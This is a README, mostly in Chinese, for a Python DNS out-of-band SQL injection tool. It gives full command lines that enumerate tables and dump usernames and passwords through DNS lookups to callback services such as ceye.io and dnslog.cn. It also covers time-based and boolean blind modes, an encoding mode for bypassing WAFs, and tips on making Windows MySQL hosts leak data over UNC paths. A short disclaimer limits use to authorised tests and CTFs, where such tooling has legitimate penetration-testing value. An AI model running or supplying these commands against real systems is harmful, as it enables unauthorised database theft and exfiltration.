# DnslogSqlinj 3

> 现代版 DNS 带外 SQL 注入工具 · Python 3 · 单文件 · 零依赖

[原版 DnslogSqlinj](https://github.com/ADOOO/DnslogSqlinj)（2019，Python 2，硬编码 ceye.io，只能 MySQL，逐字符二分）早已停更。
这是第三代重写：**一次 DNS 解析搬 30 字节**，四种数据库、四种回调平台、三种技术，一条命令跑完从爆库到脱库。

```bash
python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --dbms mysql \
  --url "http://TARGET/Less-9/?id=1'%PAYLOAD%--+-" \
  --expr "select group_concat(username,0x3a,password) from users"
```

---

## 为什么是"第三代"

| 维度 | DnslogSqlinj (2019) | **DnslogSqlinj 3** |
|---|---|---|
| 运行时 | Python 2.7 | Python 3.8+，只用标准库 |
| 回调平台 | ceye.io 硬编码 | dnslog.cn / DNSLog-GO / ceye.io / 任意 shell 命令 |
| 数据外带 | 每字符 7 次请求 | HEX 整块，1 次解析搬 30 字节，自动解码 |
| 数据库 | MySQL | MySQL / MSSQL / Oracle / PostgreSQL |
| 技术 | 只有 DNS | DNS 带外 / DNS 布尔 / SLEEP 时间盲注 |
| 体检 | 无 | `--check` 连通性自检、`--self-test` 离线自检 |
| WAF | 无处理 | 默认白名单编码，绕开 `%2F %22 %28` 类拦截 |

实测：`users` 表 188 字节，**7 次请求**拿完；同样的数据时间盲注要上千次。

---

## 安装

```bash
# 方式一：直接跑（推荐，无依赖）
git clone https://github.com/YOUR_GITHUB/dnslogsqlinj3 && cd dnslogsqlinj3
python3 dnslogsqlinj3.py --help

# 方式二：装成命令
pip install .
dnslogsqlinj3 --help
```

---

## 三步上手

```bash
# 1) 确认工具本身正常（离线，不联网）
python3 dnslogsqlinj3.py --self-test

# 2) 确认回调通道可用（领域名 → 探针解析 → 平台收没收到）
python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --check

# 3) 先用常量探路，确认注入点闭合正确
python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --dbms mysql \
  --url "http://TARGET/Less-9/?id=1'%PAYLOAD%--+-" \
  --expr "select 0x414243"
# [+] text: ABC  → 通路成立，接着正式脱库
```

### 常用表达式

```bash
--expr "select database()"
--expr "select group_concat(table_name) from information_schema.tables where table_schema=database()"
--expr "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273"
--expr "select group_concat(username,0x3a,password) from users"
```

---

## 三种技术怎么选

```bash
# A. DNS HEX 带外（默认，最快）—— 需要 FILE 权限 + 目标能出 DNS
dnslogsqlinj3 --provider ceye --token T --ident I --dbms mysql --url "..." --expr "..."

# B. DNS 布尔盲注 —— 数据不能进域名（超长/特殊字符）时用
dnslogsqlinj3 --provider ceye --token T --ident I --dbms mysql --blind --url "..." --expr "..."

# C. SLEEP 时间盲注 —— 完全不出网、没 FILE 权限也能跑
dnslogsqlinj3 --dbms mysql --technique time --sleep-delay 1.0 --samples 2 --url "..." --expr "..."
```

| 技术 | 每字符请求 | 依赖 | 188 字节数据 |
|---|---|---|---|
| `dns`（默认） | 1 次搬 30 字节 | FILE + 出 DNS | **7 次** |
| `--blind` | 7 | FILE + 出 DNS | ~1300 次 |
| `--technique time` | 7 × samples | 只要 SQL 能执行 | ~2600 次 |

判定顺序：**能带外就带外**。目标是 MySQL 且 `secure_file_priv` 为空、Windows 主机时，默认模式就是最快路径。

---

## 回调平台

| provider | 命令 | 说明 |
|---|---|---|
| `dnslog.cn` | `--provider dnslog.cn` | 免费、无需注册；公共平台，偶发限流 |
| `ceye.io` | `--provider ceye --token T --ident I` | 记录可长期查询，支持 `filter` 只拉本次任务 |
| DNSLog-GO | `--provider dnsloggo --base http://HOST:8000 --token T` | 自建，不受公共平台限流 |
| 自定义 | `--provider cmd --domain-cmd '...' --records-cmd '...'` | 接 Burp Collaborator / interactsh / 自研平台 |

ceye 的 `Token` 和 `Identifier` 都在登录后 Profile 页；两个别搞混，报 `code=21 User Not Exists` 就是 token 填错了。

---

## 参数速查

| 参数 | 作用 |
|---|---|
| `--url` | 注入点，用 `%PAYLOAD%` 占位（URL 编码后插入）或 `%SQL%`（原样插入） |
| `--expr` | 要外带的 SQL 表达式 |
| `--dbms` | `mysql` / `mssql` / `oracle` / `postgres` |
| `--technique` | `dns`（默认）/ `time` |
| `--blind` | 改用 DNS 布尔通道 |
| `--prefix` / `--suffix` | payload 前后缀，默认 `AND `；MSSQL 堆叠语句传 `;` |
| `--encode` | `auto`（默认，保 `()'"` 原样绕 WAF）/ `strict`（全量编码） |
| `--http-timeout` | 单请求超时；UNC 会挂住等 SMB，建议 5~10 |
| `--chunk` | 每次外带字节数，默认 30（hex 后 60 字符，卡 DNS label 63 上限） |
| `--sleep-delay` / `--samples` | 时间盲注的延时与采样次数 |
| `--check` / `--self-test` | 连通性体检 / 离线自检 |

---

## 踩过的坑（都已内置处理）

1. **WAF 断连**：全量 URL 编码会把 `/ " ( )` 变成 `%2F %22 %28`，部分 WAF 直接掐连接，表现为"请求 200、0.03 秒、DNS 一条不出"。默认编码只处理空格和 `& # % +`。
2. **反斜杠 UNC 不解析**：`\\host\share\a` 在某些 Windows + MySQL 组合下直接返回 NULL，只有 `//host/share/x.txt` 才发起 DNS。MySQL 模板用正斜杠。
3. **payload 缺 AND**：只替换表达式会拼出 `id='1'(SELECT …)` 语法错。`--prefix` 默认 `AND `。
4. **本机 DNS 被代理劫持**：Clash fake-ip 返回 `198.18.x.x` 时查询根本没出网，`--check` 会识别并自动改用 DoH 重发。
5. **SMB 挂住**：UNC 触发 SMB 连接时请求会挂几秒到几十秒，`--http-timeout 5` 提前断开即可，DNS 早在连接前就发出了。

---

## 开发

```bash
python3 -m unittest discover -s tests -t . -v   # 24 个用例，全离线
python3 dnslogsqlinj3.py --self-test            # 内置自检，不联网
```

测试覆盖：编码策略、四种 DBMS 模板渲染、记录解析、平台异常重试、时间盲注二分、端到端（本地假数据库 + 假平台）。

## English quickstart

```bash
python3 dnslogsqlinj3.py --self-test
python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --check
python3 dnslogsqlinj3.py --provider ceye --token TOKEN --ident IDENT --dbms mysql \
  --url "http://TARGET/item?id=1'%PAYLOAD%--+-" \
  --expr "select group_concat(table_name) from information_schema.tables where table_schema=database()"
```

Single file, standard library only, Python 3.8+. Four DBMS, four callback platforms, three techniques (DNS hex, DNS boolean, SLEEP).

## 免责声明

仅用于**你有明确授权**的测试环境、靶场与 CTF。使用者对自己的一切行为负责。

## License

MIT
